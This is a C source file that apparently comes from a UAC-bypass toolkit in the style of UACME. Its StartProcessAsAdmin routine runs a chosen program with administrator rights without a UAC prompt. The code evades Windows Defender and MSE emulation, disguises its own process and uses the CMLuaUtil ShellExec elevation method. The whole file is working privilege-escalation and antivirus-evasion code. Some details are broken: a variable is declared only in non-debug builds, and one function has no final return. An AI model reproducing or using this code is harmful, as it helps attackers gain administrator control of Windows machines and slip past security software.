#include "bypass.h"

/*
* ucmInit
*
* Purpose:
*
* Prestart phase with MSE / Windows Defender anti-emulation part.
*
* Note:
*
* supHeapAlloc unavailable during this routine and calls from it.
*
*/
NTSTATUS ucmInit()
{
    NTSTATUS    Result = STATUS_SUCCESS;
    LPWSTR      optionalParameter = NULL;
    ULONG       optionalParameterLength = 0;

#ifndef _DEBUG
    TOKEN_ELEVATION_TYPE    ElevType;
#endif	

    ULONG bytesIO;
    WCHAR szBuffer[MAX_PATH + 1];


    do {

        //we could read this from usershareddata but why not use it
        bytesIO = 0;
        RtlQueryElevationFlags(&bytesIO);
        if ((bytesIO & DBG_FLAG_ELEVATION_ENABLED) == 0) {
            Result = STATUS_ELEVATION_REQUIRED;
            break;
        }

        if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED))) {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }

        InitCommonControls();

        if (g_hInstance == NULL)
            g_hInstance = (HINSTANCE)NtCurrentPeb()->ImageBaseAddress;

        ElevType = TokenElevationTypeDefault;
        if (supGetElevationType(&ElevType)) {
            if (ElevType != TokenElevationTypeLimited) {
                return STATUS_NOT_SUPPORTED;
            }
        }
        else {
            Result = STATUS_INTERNAL_ERROR;
            break;
        }

        g_ctx = (PUACMECONTEXT)supCreateUacmeContext(supEncodePointer(DecompressPayload));


    } while (FALSE);

    if (g_ctx == NULL)
        Result = STATUS_FATAL_APP_EXIT;

    return Result;
}

NTSTATUS StartProcessAsAdmin(LPWSTR lpName, BOOL bHide) {

    NTSTATUS    Status;

    wdCheckEmulatedVFS();

    Status = ucmInit();

    if (Status != STATUS_SUCCESS) {
        return Status;
    }

    supMasqueradeProcess(FALSE);

    if (wdIsEmulatorPresent3()) {
        return STATUS_NOT_SUPPORTED;
    }

    ucmCMLuaUtilShellExecMethod(lpName, bHide);
}